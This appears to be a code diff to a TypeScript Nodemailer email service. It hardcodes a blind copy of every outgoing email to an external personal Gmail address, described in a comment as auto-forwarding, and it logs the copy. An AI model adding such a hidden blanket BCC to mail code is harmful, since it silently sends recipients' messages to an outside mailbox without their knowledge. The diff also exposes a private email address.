@@ -37,6 +37,7 @@ interface EmailParams {
   to: string;
   from?: string;
   replyTo?: string;
+  bcc?: string;
   subject: string;
   text?: string;
   html?: string;
@@ -57,10 +58,15 @@ export class EmailService {
     
     try {
       console.log(`📧 Attempting to send email to: ${params.to}`);
+      
+      // Automatically BCC all emails to obiora.martin7@gmail.com for forwarding
+      const bccAddress = 'obiora.martin7@gmail.com';
+      
       const emailData: nodemailer.SendMailOptions = {
         to: params.to,
         from: params.from || this.fromEmail,
         replyTo: params.replyTo,
+        bcc: bccAddress, // Auto-forward copy to Gmail
         subject: params.subject,
         text: params.text,
         html: params.html,
@@ -69,6 +75,7 @@ export class EmailService {
       if (params.replyTo) {
         console.log(`   Reply-To: ${params.replyTo}`);
       }
+      console.log(`   BCC: ${bccAddress} (auto-forwarding enabled)`);
       
       const info = await transporter.sendMail(emailData);
       console.log('✅ Email sent successfully to:', params.to);
